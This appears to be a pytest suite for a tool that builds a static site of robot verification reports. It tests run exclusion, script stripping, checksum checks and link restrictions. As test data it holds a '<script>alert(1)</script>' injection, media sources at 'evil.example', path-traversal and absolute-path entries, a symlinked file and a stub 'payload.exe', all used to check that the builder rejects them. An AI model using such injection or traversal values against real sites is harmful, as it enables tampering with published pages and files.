        encoding="utf-8",
    )

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    reports_without_exclude = tmp_path / "reports-without-exclude"
    shutil.copytree(reports, reports_without_exclude)
    with pytest.raises(site_tool.SiteError, match="restored"):
        site_tool.build(reports_without_exclude, tmp_path / "in2", repository=REPO)

    capsys.readouterr()
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("920",), repository=REPO)
    err = capsys.readouterr().err

    assert "::warning::" in err
    assert "920" in err
    assert not hostile_run.exists()
    assert {p: p.read_bytes() for p in kept_run.rglob("*") if p.is_file()} == kept_before
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/921/index.html").is_file()

    history_html = (reports / "unitree-g1/stock-mujoco-hallway/index.html").read_text(
        encoding="utf-8"
    )
    latest_html = (reports / "unitree-g1/stock-mujoco-hallway/latest/index.html").read_text(
        encoding="utf-8"
    )
    index_html = (reports / "index.html").read_text(encoding="utf-8")
    assert "runs/920/" not in history_html
    assert "runs/920/" not in latest_html
    assert "runs/920/" not in index_html
    assert "runs/921/" in latest_html
    assert site_tool.read_json_object(reports / site_tool.MARKER)["runs"] == 2


def test_exclude_runs_removes_empty_scenario_when_only_restored_run_is_excluded(
    tmp_path: Path, capsys
):
    _make_run_folder(
        tmp_path / "in1",
        "corner-left",
        variant="stock-mujoco-corner-left",
        run_id="918",
        created="2026-11-18T06:00:00Z",
    )
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1", repository=REPO)
    assert (reports / "unitree-g1/stock-mujoco-corner-left/runs/918").is_dir()

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("918",), repository=REPO)
    err = capsys.readouterr().err

    assert "::warning::" in err
    assert "918" in err
    assert not (reports / "unitree-g1/stock-mujoco-corner-left").exists()
    index_html = (reports / "index.html").read_text(encoding="utf-8")
    assert "stock-mujoco-corner-left" not in index_html
    assert "stock-mujoco-hallway" in index_html
    assert site_tool.read_json_object(reports / site_tool.MARKER)["runs"] == 1


def test_exclude_runs_unknown_id_only_warns(tmp_path: Path, capsys):
    reports, run = _restored_run(tmp_path)
    before = {p: p.read_bytes() for p in run.rglob("*") if p.is_file()}

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    capsys.readouterr()
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("999999",), repository=REPO)
    err = capsys.readouterr().err

    assert "::warning::" in err
    assert "999999" in err
    assert {p: p.read_bytes() for p in run.rglob("*") if p.is_file()} == before
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/921/index.html").is_file()


def test_exclude_runs_matching_a_new_run_fails(tmp_path: Path):
    reports, run = _restored_run(tmp_path)
    before = {p: p.read_bytes() for p in run.rglob("*") if p.is_file()}

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    with pytest.raises(site_tool.SiteError, match="exclude-runs"):
        site_tool.build(reports, tmp_path / "in2", exclude_runs=("921",), repository=REPO)

    assert {p: p.read_bytes() for p in run.rglob("*") if p.is_file()} == before
    assert not (reports / "unitree-g1/stock-mujoco-hallway/runs/921").exists()


def test_exclude_runs_ids_are_global_and_remove_the_run_from_every_scenario(tmp_path: Path, capsys):
    # A run folder is named after the workflow run, so one run ID can hold several scenarios.
    _make_run_folder(tmp_path / "in1/a", "hallway", run_id="919", created="2026-11-19T06:00:00Z")
    _make_run_folder(tmp_path / "in1/b", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
    _make_run_folder(
        tmp_path / "in1/c",
        "corner-left",
        variant="stock-mujoco-corner-left",
        run_id="920",
        created="2026-11-20T06:00:00Z",
    )
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1", repository=REPO)
    assert (reports / "unitree-g1/stock-mujoco-corner-left/runs/920").is_dir()

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    capsys.readouterr()
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("920", "920"), repository=REPO)
    err = capsys.readouterr().err

    assert not (reports / "unitree-g1/stock-mujoco-hallway/runs/920").exists()
    assert not (reports / "unitree-g1/stock-mujoco-corner-left").exists()
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/919").is_dir()
    assert err.count("::warning::Excluded restored run 920") == 2
    assert "stock-mujoco-corner-left/runs/920" in err
    assert "not found" not in err
    assert site_tool.read_json_object(reports / site_tool.MARKER)["runs"] == 2


def test_parse_exclude_runs_splits_on_commas_and_whitespace_and_drops_duplicates():
    assert site_tool.parse_exclude_runs("") == ()
    assert site_tool.parse_exclude_runs(" \n\t ") == ()
    assert site_tool.parse_exclude_runs("920, 921\r\n922\t920,921") == ("920", "921", "922")
    assert site_tool.parse_exclude_runs("920 921\n922\t920") == ("920", "921", "922")


def test_exclude_runs_skips_a_restored_run_with_unpublished_evidence(tmp_path: Path):
    reports, run = _restored_run(tmp_path)
    (run / "evidence").mkdir(exist_ok=True)
    (run / "evidence/payload.exe").write_bytes(b"MZ")
    reports_without_exclude = tmp_path / "reports-without-exclude"
    shutil.copytree(reports, reports_without_exclude)
    with pytest.raises(site_tool.SiteError, match="evidence of this type is not published"):
        _build_next_run(tmp_path, reports_without_exclude)

    _make_run_folder(tmp_path / "in3", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    site_tool.build(reports, tmp_path / "in3", exclude_runs=("920",), repository=REPO)
    assert not run.exists()
    assert (reports / "unitree-g1/stock-mujoco-hallway/runs/921/index.html").is_file()


def test_an_excluded_run_is_not_restored_by_the_next_build_without_the_entry(tmp_path: Path):
    reports, run = _restored_run(tmp_path)
    report_html = run / "report.html"
    report_html.write_text(
        report_html.read_text(encoding="utf-8").replace(
            "</body>", "<script>alert(1)</script></body>", 1
        ),
        encoding="utf-8",
    )
    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("920",), repository=REPO)

    # The deployed tree is what the next build restores; the entry has been removed.
    deployed = tmp_path / "deployed"
    shutil.copytree(reports, deployed)
    _make_run_folder(tmp_path / "in3", "hallway", run_id="922", created="2026-11-22T06:00:00Z")
    site_tool.build(deployed, tmp_path / "in3", repository=REPO)

    runs_root = deployed / "unitree-g1/stock-mujoco-hallway/runs"
    assert sorted(p.name for p in runs_root.iterdir()) == ["921", "922"]
    assert "runs/920/" not in (deployed / "unitree-g1/stock-mujoco-hallway/index.html").read_text(
        encoding="utf-8"
    )


# ---------------------------------------------------------------- issue #40: exclude-runs follow-up


def test_exclude_runs_matching_is_exact_not_prefix_or_case_insensitive(tmp_path: Path, capsys):
    _make_run_folder(tmp_path / "in1/r1", "hallway", run_id="920", created="2026-11-19T06:00:00Z")
    _make_run_folder(tmp_path / "in1/r2", "hallway", run_id="AbC", created="2026-11-20T06:00:00Z")
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1", repository=REPO)

    _make_run_folder(
        tmp_path / "in2/n1", "hallway", run_id="NewRun", created="2026-11-21T06:00:00Z"
    )
    _make_run_folder(tmp_path / "in2/n2", "hallway", run_id="921", created="2026-11-22T06:00:00Z")
    capsys.readouterr()
    site_tool.build(
        reports,
        tmp_path / "in2",
        exclude_runs=("92", "9200", "abc", "newrun"),
        repository=REPO,
    )
    err = capsys.readouterr().err

    runs_root = reports / "unitree-g1/stock-mujoco-hallway/runs"
    assert sorted(p.name for p in runs_root.iterdir()) == ["920", "921", "AbC", "NewRun"]
    assert site_tool.read_json_object(reports / site_tool.MARKER)["runs"] == 4
    for entry in ("92", "9200", "abc", "newrun"):
        assert f"exclude-runs entry {entry!r} was not found in restored history." in err


@pytest.mark.parametrize("bad_entry", ["../920", "a/b", "", "920\n921", ".hidden"])
def test_build_revalidates_exclude_runs_entries(tmp_path: Path, bad_entry: str):
    reports, run = _restored_run(tmp_path)
    before = {p: p.read_bytes() for p in run.rglob("*") if p.is_file()}

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    with pytest.raises(site_tool.SiteError, match="exclude-runs"):
        site_tool.build(reports, tmp_path / "in2", exclude_runs=(bad_entry,), repository=REPO)

    assert {p: p.read_bytes() for p in run.rglob("*") if p.is_file()} == before
    assert not (reports / "unitree-g1/stock-mujoco-hallway/runs/921").exists()


def test_runs_skips_and_warns_unreadable_run_json_when_excluded(tmp_path: Path, capsys):
    _make_run_folder(tmp_path / "in1/r1", "hallway", run_id="919", created="2026-11-19T06:00:00Z")
    _make_run_folder(tmp_path / "in1/r2", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1", repository=REPO)

    bad_run = reports / "unitree-g1/stock-mujoco-hallway/runs/920"
    (bad_run / "run.json").write_text("{not valid json", encoding="utf-8")

    with pytest.raises(site_tool.SiteError, match="not valid JSON"):
        site_tool.runs(reports)

    capsys.readouterr()
    found = site_tool.runs(reports, exclude_runs={"920"})
    err = capsys.readouterr().err

    assert "::warning::Excluded restored run 920" in err
    assert [r["folder"] for r in found[("unitree-g1", "stock-mujoco-hallway")]] == ["919"]


def test_build_excludes_restored_run_with_unreadable_run_json_and_fails_when_not_excluded(
    tmp_path: Path, capsys
):
    _make_run_folder(tmp_path / "in1/r1", "hallway", run_id="919", created="2026-11-19T06:00:00Z")
    _make_run_folder(tmp_path / "in1/r2", "hallway", run_id="920", created="2026-11-20T06:00:00Z")
    reports = tmp_path / "reports"
    site_tool.build(reports, tmp_path / "in1", repository=REPO)

    bad_run = reports / "unitree-g1/stock-mujoco-hallway/runs/920"
    (bad_run / "run.json").write_text("{not valid json", encoding="utf-8")

    _make_run_folder(tmp_path / "in2", "hallway", run_id="921", created="2026-11-21T06:00:00Z")
    reports_without_exclude = tmp_path / "reports-without-exclude"
    shutil.copytree(reports, reports_without_exclude)
    with pytest.raises(site_tool.SiteError, match="not valid JSON"):
        site_tool.build(reports_without_exclude, tmp_path / "in2", repository=REPO)

    capsys.readouterr()
    site_tool.build(reports, tmp_path / "in2", exclude_runs=("920",), repository=REPO)
    err = capsys.readouterr().err

    assert "::warning::Excluded restored run 920" in err
    assert "not found" not in err
    assert not bad_run.exists()
    runs_root = reports / "unitree-g1/stock-mujoco-hallway/runs"
    assert sorted(p.name for p in runs_root.iterdir()) == ["919", "921"]
    assert site_tool.read_json_object(reports / site_tool.MARKER)["runs"] == 2


def test_runs_unsafe_path_still_fails_even_when_folder_is_excluded(tmp_path: Path):
    reports = tmp_path / "reports"
    unsafe = reports / ".bad_robot" / "stock-mujoco-hallway" / "runs" / "920"
    unsafe.mkdir(parents=True)
    (unsafe / "run.json").write_text("{not valid json", encoding="utf-8")

    with pytest.raises(site_tool.SiteError, match="unsafe run path"):
        site_tool.runs(reports, exclude_runs={"920"})


@pytest.mark.parametrize(
    "payload",
    [
        "{}",
        '{"run": {}}',
        '{"run": {"id": "920", "created": ""}}',
    ],
)
def test_runs_missing_run_created_raises_site_error_not_key_error(tmp_path: Path, payload: str):
    reports, run = _restored_run(tmp_path)
    (run / "run.json").write_text(payload, encoding="utf-8")

    with pytest.raises(site_tool.SiteError):
        site_tool.runs(reports)

    found = site_tool.runs(reports, exclude_runs={"920"})
    assert found == {}


# ---------------------------------------------------------------- va#32 B1: many unknown scripts


def test_many_unknown_scripts_are_cut_out_in_one_pass_with_few_warnings(capsys):
    from livingproof_capability_report.site import pages as reports_render

    # Vera's PR 35 B1 probe: 200,000 copies of an unknown reporter-style script (about
    # 7 MiB). Cutting them out one at a time copies the page per script, which takes well
    # over a minute; one pass takes a few seconds, so the 30 s timeout is generous.
    count = 200_000
    script = "<script data-report-times>x</script>"
    page = _page(script * count)
    with _time_limit(30):
        assert reports_render.checked_report_html(page, "probe") == _page("")
    warnings = capsys.readouterr().err.splitlines()
    assert len(warnings) == reports_render._SCRIPT_WARNING_EXAMPLES + 1
    assert f"removed {count} <script> elements" in warnings[-1]


def test_unknown_scripts_are_cut_out_exactly(capsys):
    from livingproof_capability_report.site import pages as reports_render

    page = _page("a<script data-report-times>x</script>b<script data-eval-tabs>y</script>c")
    assert reports_render.checked_report_html(page, "probe") == _page("abc")
    assert len(capsys.readouterr().err.splitlines()) == 2


# ---------------------------------------------------------------- va#29 N2 & N3


@pytest.mark.parametrize(
    "markup",
    [
        "<img src='https://evil.example/x.png'>",
        "<video src='https://evil.example/x.png'></video>",
        "<video src='evidence/a.mp4' poster='https://evil.example/x.png'></video>",
    ],
)
def test_report_media_attributes_refuse_https_urls(markup: str):
    from livingproof_capability_report.site import pages as reports_render

    with pytest.raises(site_tool.SiteError, match="relative link"):
        reports_render.checked_report_html(_page(markup), "probe")


@pytest.mark.parametrize(
    "markup",
    [
        "<img src='evidence/a.png'>",
        "<video src='evidence/a.mp4'></video>",
        "<video src='evidence/a.mp4' poster='evidence/a.png'></video>",
        "<a href='https://ok.example/'>x</a>",
    ],
)
def test_report_media_attributes_accept_relative_links_and_anchors_accept_https(markup: str):
    from livingproof_capability_report.site import pages as reports_render

    page = _page(markup)
    assert reports_render.checked_report_html(page, "probe") == page


def test_invalid_utf8_report_html_is_refused_with_file_and_byte_offset(tmp_path: Path):
    folder = _make_run_folder(tmp_path / "in", "hallway", run_id="930")
    payload = b"<!doctype html><html><body><p>bad\xffbyte</p></body></html>\n"
    offset = payload.index(b"\xff")
    (folder / "report.html").write_bytes(payload)
    (folder / "SHA256SUMS").write_text(
        "".join(
            f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
            for n in site_tool.REPORT_FILES
        ),
        encoding="utf-8",
    )
    reports_dir = tmp_path / "reports"
    with pytest.raises(site_tool.SiteError) as exc_info:
        site_tool.build(reports_dir, tmp_path / "in", repository=REPO)
    message = str(exc_info.value)
    assert "report.html" in message
    assert f"byte {offset}" in message
    assert not list(reports_dir.rglob("runs/930/index.html"))
    assert not (reports_dir / "index.html").exists()
    assert not (reports_dir / "site.json").exists()


CI_RUN = "https://github.com/org/repo/actions/runs/7"


def test_public_page_check_allows_the_ci_run_address_and_nothing_else_under_actions(
    tmp_path: Path,
):
    reports = tmp_path / "reports"
    reports.mkdir()
    page = reports / "index.html"
    page.write_text(f"<p><a href='{CI_RUN}'>CI run</a> {CI_RUN}.</p>", encoding="utf-8")
    assert site_tool.public_page_problems(reports, repository="org/repo") == []
    assert not site_tool.html_is_dirty(page.read_text(encoding="utf-8"), repository="org/repo")
    for bad in (
        CI_RUN + "/job/5",
        CI_RUN + "/attempts/2",
        CI_RUN + "/artifacts/101",
        CI_RUN + "x",
        CI_RUN + "?check_suite_focus=true",
        "https://github.com/org/repo/actions/workflows/ci.yml",
        "https://github.com/org/repo/actions/runs/",
    ):
        page.write_text(f"<p><a href='{CI_RUN}'>CI run</a> <a href='{bad}'>x</a></p>", "utf-8")
        assert "index.html links to /actions/" in site_tool.public_page_problems(
            reports, repository="org/repo"
        ), bad
        assert site_tool.html_is_dirty(page.read_text(encoding="utf-8"), repository="org/repo"), bad


def test_the_ci_run_link_is_published_and_artifact_addresses_still_are_not(tmp_path: Path):
    this_run = f"https://github.com/{REPO}/actions/runs/100"
    runs_in = tmp_path / "in"
    folder = _make_run_folder(
        runs_in,
        "hallway",
        html_override=(
            "<!doctype html><html><body><main><div class='card evidence'><h2>Evidence</h2><ul>"
            f"<li><a href='{this_run}'>CI run</a></li>"
            f"<li><a href='{this_run}/artifacts/101'>MCAP</a></li>"
            "</ul></div></main></body></html>\n"
        ),
    )
    rep = json.loads((folder / "report.json").read_text(encoding="utf-8"))
    rep["evidence_links"] = {
        "run": this_run,
        "links": [{"label": "MCAP", "kind": "mcap", "url": this_run + "/artifacts/101"}],
    }
    (folder / "report.json").write_text(json.dumps(rep), encoding="utf-8")
    (folder / "report.md").write_text(
        f"**Evidence:** [CI run]({this_run}) · [MCAP]({this_run}/artifacts/101)\n", encoding="utf-8"
    )
    (folder / "SHA256SUMS").write_text(
        "".join(
            f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
            for n in site_tool.REPORT_FILES
        ),
        encoding="utf-8",
    )
    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in, repository=REPO)
    run = next(reports_dir.glob("*/*/runs/*"))
    page = (run / "index.html").read_text(encoding="utf-8")
    assert f"<a href='{this_run}'>CI run</a>" in page
    assert "/artifacts/" not in page
    assert f"<a href='{this_run}'>CI run</a>" in (run / "report.html").read_text(encoding="utf-8")
    assert f"[CI run]({this_run})" in (run / "report.md").read_text(encoding="utf-8")
    assert "/artifacts/" not in (run / "report.md").read_text(encoding="utf-8")
    assert (
        json.loads((run / "report.json").read_text(encoding="utf-8"))["evidence_links"]["run"]
        == this_run
    )
    assert site_tool.public_page_problems(reports_dir, repository=REPO) == []


def test_an_evidence_link_to_a_file_the_site_did_not_publish_is_plain_text(tmp_path: Path):
    runs_in = tmp_path / "in"
    _make_run_folder(
        runs_in,
        "hallway",
        evidence_files={"video/kept.mp4": b"mp4"},
        html_override=(
            "<!doctype html><html><body><main><div class='card evidence'><h2>Evidence</h2><ul>"
            "<li class='evidence-video'><p class='evidence-label'>kept clip</p>"
            "<video controls preload='metadata' src='evidence/video/kept.mp4'></video></li>"
            "<li class='evidence-video'><p class='evidence-label'>lost clip</p>"
            "<video controls preload='metadata' src='evidence/video/lost.mp4'></video></li>"
            "<li><a href='evidence/video/lost.mp4'>lost link</a></li>"
            "</ul></div></main></body></html>\n"
        ),
    )
    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in, repository=REPO)
    run = next(reports_dir.glob("*/*/runs/*"))
    for name in ("index.html", "report.html"):
        page = (run / name).read_text(encoding="utf-8")
        assert "src='evidence/video/kept.mp4'" in page
        assert "lost.mp4" not in page
        assert "lost clip" in page
        assert "lost link" in page
        assert "<a href='evidence/video/lost.mp4'" not in page


def test_real_reporter_3_17_0_run_page_links_the_ci_run_video_and_recording(tmp_path: Path):
    # Rendered by reporter v3.17.0 from the real G1 bundle of Verify run 46110994356, with the
    # links document the collect job now writes (site paths for the media it copies).
    fixture = ROOT / "tests/fixtures/reporter/report-v3.17.0-g1-evidence-links.html"
    text = fixture.read_text(encoding="utf-8")
    media = {"video/trial-01-fail.mp4": b"mp4", "mcap/mcap/trial-01.mcap": b"mcap"}
    _make_run_folder(
        tmp_path / "in",
        "hallway",
        run_id="46110994356",
        html_override=text,
        evidence_files=media,
        caller="Living-Proof-Labs/verification-reports-action",
    )
    site_tool.build(
        tmp_path / "reports",
        tmp_path / "in",
        repository="Living-Proof-Labs/verification-reports-action",
    )
    reports = tmp_path / "reports"
    run = next(reports.glob("*/*/runs/46110994356"))
    run_url = (
        "https://github.com/Living-Proof-Labs/verification-reports-action/actions/runs/46110994356"
    )
    for name in ("index.html", "report.html"):
        page = (run / name).read_text(encoding="utf-8")
        assert f"<a href='{run_url}'>CI run</a>" in page
        assert "<a href='evidence/mcap/mcap/trial-01.mcap'>MCAP, all 1 trials</a>" in page
        assert "<video controls preload='metadata' src='evidence/video/trial-01-fail.mp4'>" in page
        assert "<td><a href='evidence/video/trial-01-fail.mp4'>video</a></td>" in page
    # The action's require_reports.run_page_problems stays in the action (it gates the
    # deployed Pages tree); the player and video-cell asserts above cover the same page here.
    assert (
        site_fixture.check_reports_tree(
            reports, repository="Living-Proof-Labs/verification-reports-action"
        )
        == []
    )
    assert (
        site_tool.public_page_problems(
            reports, repository="Living-Proof-Labs/verification-reports-action"
        )
        == []
    )


def test_a_run_link_to_another_repository_is_plain_text_on_the_published_page(tmp_path: Path):
    this_run = f"https://github.com/{REPO}/actions/runs/100"
    other = "https://github.com/other-org/other-repo/actions/runs/100"
    runs_in = tmp_path / "in"
    folder = _make_run_folder(
        runs_in,
        "hallway",
        html_override=(
            "<!doctype html><html><body><main><div class='card evidence'><h2>Evidence</h2><ul>"
            f"<li><a href='{this_run}'>CI run</a></li>"
            f"<li><a href='{other}'>other run</a></li>"
            "</ul></div></main></body></html>\n"
        ),
    )
    rep = json.loads((folder / "report.json").read_text(encoding="utf-8"))
    rep["evidence_links"] = {"run": this_run, "links": []}
    (folder / "report.json").write_text(json.dumps(rep), encoding="utf-8")
    (folder / "SHA256SUMS").write_text(
        "".join(
            f"{hashlib.sha256((folder / n).read_bytes()).hexdigest()}  {n}\n"
            for n in site_tool.REPORT_FILES
        ),
        encoding="utf-8",
    )
    reports_dir = tmp_path / "reports"
    site_tool.build(reports_dir, runs_in, repository=REPO)
    run = next(reports_dir.glob("*/*/runs/*"))
    page = (run / "index.html").read_text(encoding="utf-8")
    assert f"<a href='{this_run}'>CI run</a>" in page
    assert f"<a href='{other}'>" not in page
    assert "other run" in page
    stored = json.loads((run / "report.json").read_text(encoding="utf-8"))
    assert stored["evidence_links"]["run"] == this_run
    assert site_tool.public_page_problems(reports_dir, repository=REPO) == []


# ---------------------------------------------------------------- va#75: parity with the action

G1_HISTORY = ROOT / "tests/fixtures/site-g1-history"
G1_REPOSITORY = "Living-Proof-Labs/verification-reports-action"  # the restored run.url


def _g1_history_site(tmp_path: Path) -> Path:
    reports = tmp_path / "reports"
    shutil.copytree(G1_HISTORY / "unitree-g1", reports / "unitree-g1")
    new_run = _make_run_folder(
        tmp_path / "incoming",
        "new",
        repository="Living-Proof-Labs/livingproof-unitree-g1",
        caller=G1_REPOSITORY,
        variant="unitree-g1-stock-mujoco-hallway",
        run_id="88888888888",
        created="2026-11-27T12:00:00Z",
    )
    site_tool.build(
        reports, new_run.parent, allow_replace_run_id="88888888888", repository=G1_REPOSITORY
    )
    return reports


def test_real_g1_history_matches_the_bytes_the_action_rendered(tmp_path: Path):
    # The golden digests were written by verification-reports-action's src/reports_site.py
    # (2e74cce and PR 84 head aa14bf0 agree) from the same restored G1 run plus one new run.
    expected = (ROOT / "tests/fixtures/site-golden/g1-history.SHA256SUMS").read_text(
        encoding="utf-8"
    )
    assert site_fixture.digests(_g1_history_site(tmp_path)) == expected


def test_a_restored_real_g1_run_is_kept_byte_for_byte_and_its_evidence_still_expires(
    tmp_path: Path,
):
    reports = _g1_history_site(tmp_path)
    old = reports / "unitree-g1/stock-mujoco-hallway/runs/45754832566"
    source = G1_HISTORY / "unitree-g1/stock-mujoco-hallway/runs/45754832566"
    for path in sorted(source.rglob("*")):
        if path.is_file():
            relative = path.relative_to(source)
            assert (old / relative).read_bytes() == path.read_bytes(), relative
    history = (reports / "unitree-g1/stock-mujoco-hallway/index.html").read_text(encoding="utf-8")
    assert "45754832566" in history and "88888888888" in history
    assert site_fixture.check_reports_tree(reports, repository=G1_REPOSITORY) == []
    site_tool.render(reports, now="2027-02-01T00:00:00Z", days=7, repository=G1_REPOSITORY)
    assert (old / "health.json").is_file()
    assert not (old / "evidence/video/trial-01-fail.mp4").exists()
    assert not (old / "evidence/mcap/mcap/trial-01.mcap").exists()


NOTES = "notes.json"


@pytest.mark.parametrize(
    ("uri", "mutate", "message"),
    [
        (NOTES, "sha", "does not match SHA256SUMS"),
        ("../x.json", "path", "is not a relative path"),
        ("/tmp/x.json", "absolute", "is absolute"),
        (NOTES, "symlink", "is a symlink"),
        (NOTES, "missing", "not listed in SHA256SUMS"),
    ],
)
def test_the_site_refuses_an_unsafe_cited_details_file(tmp_path, uri, mutate, message):
    """va T3 site guards, from the action's tests/test_advisory_details.py."""
    data = b"{}\n"
    digest_hex = "0" * 64 if mutate == "sha" else hashlib.sha256(data).hexdigest()
    listed = "other.json" if mutate == "missing" else uri
    source = tmp_path / "source"
    source.mkdir()
    if mutate in {"path", "absolute"}:
        (source / "SHA256SUMS").write_text("", encoding="utf-8")
    else:
        (source / "SHA256SUMS").write_text(f"{digest_hex}  {listed}\n", encoding="utf-8")
    if mutate == "symlink":
        (source / "target.json").write_bytes(data)
        (source / NOTES).symlink_to("target.json")
    elif mutate == "missing":
        (source / NOTES).write_bytes(data)
        (source / "other.json").write_bytes(data)
    elif mutate not in {"path", "absolute"}:
        (source / uri).write_bytes(data)
    report = {
        "source_bundle": {
            "assessment": {
                "advisory_results": {"cited": {"advisory": {"details_file": {"uri": uri}}}}
            }
        }
    }
    with pytest.raises(site_tool.SiteError, match=message):
        site_tool._publish_cited_details(source, tmp_path / "out", report)
